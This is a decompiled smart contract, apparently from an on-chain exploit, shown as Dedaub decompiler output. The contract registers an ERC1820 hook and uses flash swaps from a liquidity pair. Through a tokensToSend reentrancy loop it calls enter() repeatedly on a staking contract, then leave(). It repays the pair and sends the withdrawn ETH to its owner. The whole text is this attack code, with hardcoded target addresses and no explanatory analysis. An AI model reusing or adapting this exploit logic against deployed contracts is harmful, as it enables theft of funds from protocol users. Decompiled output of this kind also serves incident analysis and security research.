// Decompiled by library.dedaub.com
// 2023.01.14 05:59 UTC

// Data structures and variables inferred from the use of storage instructions
uint256 stor_6; // STORAGE[0x6]
uint256 stor_7; // STORAGE[0x7]
uint256 _fallback; // STORAGE[0x8]
uint256 stor_9; // STORAGE[0x9]
uint256 _tokensToSend; // STORAGE[0xa]
address owner_0_0_19; // STORAGE[0x0] bytes 0 to 19
address owner_1_0_19; // STORAGE[0x1] bytes 0 to 19
address stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
address stor_4_0_19; // STORAGE[0x4] bytes 0 to 19
address stor_5_0_19; // STORAGE[0x5] bytes 0 to 19


function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    require(varg0 <= 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - varg1, Panic(17));
    return varg0 + varg1;
}

function _SafeDiv(uint256 varg0, uint256 varg1) private { 
    require(varg1, Panic(18));
    return varg0 / varg1;
}

function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require(!(varg0 & (varg1 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / varg0)), Panic(17));
    return varg0 * varg1;
}

function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 >= varg1, Panic(17));
    return varg0 - varg1;
}

function 0x17cb(uint256 varg0) private { 
    require(varg0 == varg0);
    return ;
}

function canImplementInterfaceForAddress(bytes32 varg0, address varg1) public nonPayable { 
    require(4 + (msg.data.length - 4) - 4 >= 64);
    require(varg0 == varg0);
    require(varg1 == varg1);
    MEM[64] = 32 + MEM[64] + 20;
    return keccak256('ERC1820_ACCEPT_MAGIC');
}

function 0x44fea28d() public nonPayable { 
    require(msg.sender == owner_0_0_19);
    stor_7 = 3;
    stor_2_0_19 = 0x5006192340d83bfa47ee2f28edd0fd16a56d5b5e;
    stor_4_0_19 = 0x3c4f8a74b54175e372fc784a83c5b2d6bcd12ee2;
    owner_1_0_19 = 0x8d7b35c1446f51c67d64f6884aa644c741a16d6e;
    0x823();
}

function 0x68b32369() public nonPayable { 
    return _fallback;
}

function tokensToSend(address varg0, address varg1, address varg2, uint256 varg3, bytes varg4, bytes varg5) public nonPayable { 
    require(4 + (msg.data.length - 4) - 4 >= 192);
    require(varg0 == varg0);
    require(varg1 == varg1);
    require(varg2 == varg2);
    0x17cb(varg3);
    require(varg4 <= 0xffffffffffffffff);
    require(4 + varg4 + 31 < 4 + (msg.data.length - 4));
    require(varg4.length <= 0xffffffffffffffff);
    require(varg4.data + varg4.length <= 4 + (msg.data.length - 4));
    require(varg5 <= 0xffffffffffffffff);
    require(4 + varg5 + 31 < 4 + (msg.data.length - 4));
    require(varg5.length <= 0xffffffffffffffff);
    require(varg5.data + varg5.length <= 4 + (msg.data.length - 4));
    v0 = _SafeSub(stor_7, 1);
    if (_tokensToSend >= v0) {
        if (_tokensToSend == stor_7) {
            v1 = _SafeAdd(_tokensToSend, 1);
            _tokensToSend = v1;
            require(stor_2_0_19.code.size);
            v2, v3 = stor_2_0_19.balanceOf(address(this)).gas(msg.gas);
            require(v2); // checks call status, propagates error data on error
            MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            0x17cb(v3);
            require(stor_4_0_19.code.size);
            v4 = stor_4_0_19.enter(v3).gas(msg.gas);
            require(v4); // checks call status, propagates error data on error
        }
    } else {
        0x3da();
    }
}

function 0x7d76c120() public nonPayable { 
    return stor_9;
}

function 0xfc7e3db8() public nonPayable { 
    require(msg.sender == owner_0_0_19);
    require(stor_5_0_19.code.size);
    v0 = stor_5_0_19.setInterfaceImplementer(address(this), 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, 
    address(this)).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    0x823();
}

function 0x3da() private { 
    v0 = _SafeAdd(_tokensToSend, 1);
    _tokensToSend = v0;
    require(stor_4_0_19.code.size);
    v1 = stor_4_0_19.enter(stor_6).gas(msg.gas);
    require(v1); // checks call status, propagates error data on error
    return ;
}

function () public payable { 
    if (msg.sender == owner_1_0_19) {
        0x3da();
        require(stor_4_0_19.code.size);
        v0, v1 = stor_4_0_19.balanceOf(address(this)).gas(msg.gas);
        require(v0); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x17cb(v1);
        require(stor_4_0_19.code.size);
        v2 = stor_4_0_19.leave(v1).gas(msg.gas);
        require(v2); // checks call status, propagates error data on error
        v3 = _SafeMul(_fallback, 0xf4240);
        v4 = _SafeDiv(v3, 0xf3688);
        v5 = _SafeAdd(v4, 2);
        require(stor_2_0_19.code.size);
        v6, v7 = stor_2_0_19.transfer(owner_1_0_19, v5).gas(msg.gas);
        require(v6); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v7 == v7);
    }
}

function 0x823() private { 
    0xa9e();
    0xa9e();
    0xa9e();
    0xa9e();
    require(stor_3_0_19.code.size);
    v0, v1 = stor_3_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x17cb(v1);
    require(stor_3_0_19.code.size);
    v2 = stor_3_0_19.withdraw(v1).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    v3 = owner_0_0_19.call().value(v1).gas(!v1 * 2300);
    require(v3); // checks call status, propagates error data on error
    return ;
}

function 0xa9e() private { 
    require(owner_1_0_19.code.size);
    v0, v1, v2, v3 = owner_1_0_19.getReserves().gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 96);
    require(v1 == v1 & 0xffffffffffffffffffffffffffff);
    require(v2 == v2 & 0xffffffffffffffffffffffffffff);
    require(v3 == uint32(v3));
    stor_9 = 0xffffffffffffffffffffffffffff & v2;
    _fallback = 0xffffffffffffffffffffffffffff & v1;
    v4 = _SafeDiv(_fallback, stor_7);
    stor_6 = v4;
    v5 = _SafeMul(_fallback, 500);
    require(stor_2_0_19.code.size);
    v6 = stor_2_0_19.approve(stor_4_0_19, v5).gas(msg.gas);
    require(v6); // checks call status, propagates error data on error
    v7 = _SafeSub(_fallback, 1);
    require(owner_1_0_19.code.size);
    v8 = owner_1_0_19.swap(v7, 0, address(this), '0x333').gas(msg.gas);
    require(v8); // checks call status, propagates error data on error
    require(stor_2_0_19.code.size);
    v9, v10 = stor_2_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v9); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    0x17cb(v10);
    require(stor_2_0_19.code.size);
    v11, v12 = stor_2_0_19.transfer(owner_1_0_19, v10).gas(msg.gas);
    require(v11); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v12 == v12);
    require(owner_1_0_19.code.size);
    v13, v14, v15, v16 = owner_1_0_19.getReserves().gas(msg.gas);
    require(v13); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 96);
    require(v14 == v14 & 0xffffffffffffffffffffffffffff);
    require(v15 == v15 & 0xffffffffffffffffffffffffffff);
    require(v16 == uint32(v16));
    stor_9 = 0xffffffffffffffffffffffffffff & v15;
    _fallback = 0xffffffffffffffffffffffffffff & v14;
    v17 = _SafeAdd(_fallback, v10);
    v18 = _SafeMul(_fallback, stor_9);
    v19 = _SafeDiv(v18, v17);
    v20 = _SafeSub(stor_9, v19);
    v21 = _SafeMul(v20, 0xf3688);
    v22 = _SafeDiv(v21, 0xf4240);
    v23 = new array[](0);
    require(owner_1_0_19.code.size);
    v24 = owner_1_0_19.swap(0, v22, address(this), v23).gas(msg.gas);
    require(v24); // checks call status, propagates error data on error
    _tokensToSend = 0;
    return ;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        ();
    } else if (0x249cb3fa == function_selector >> 224) {
        canImplementInterfaceForAddress(bytes32,address);
    } else if (0x44fea28d == function_selector >> 224) {
        0x44fea28d();
    } else if (0x68b32369 == function_selector >> 224) {
        0x68b32369();
    } else if (0x75ab9782 == function_selector >> 224) {
        tokensToSend(address,address,address,uint256,bytes,bytes);
    } else if (0x7d76c120 == function_selector >> 224) {
        0x7d76c120();
    } else if (0xfc7e3db8 == function_selector >> 224) {
        0xfc7e3db8();
    } else {
        if (msg.sender == owner_1_0_19) {
            0x3da();
            require(stor_4_0_19.code.size);
            v0, v1 = stor_4_0_19.balanceOf(address(this)).gas(msg.gas);
            require(v0); // checks call status, propagates error data on error
            MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            0x17cb(v1);
            require(stor_4_0_19.code.size);
            v2 = stor_4_0_19.leave(v1).gas(msg.gas);
            require(v2); // checks call status, propagates error data on error
            v3 = _SafeMul(_fallback, 0xf4240);
            v4 = _SafeDiv(v3, 0xf3688);
            v5 = _SafeAdd(v4, 2);
            require(stor_2_0_19.code.size);
            v6, v7 = stor_2_0_19.transfer(owner_1_0_19, v5).gas(msg.gas);
            require(v6); // checks call status, propagates error data on error
            MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            require(v7 == v7);
        }
        exit;
    }
}
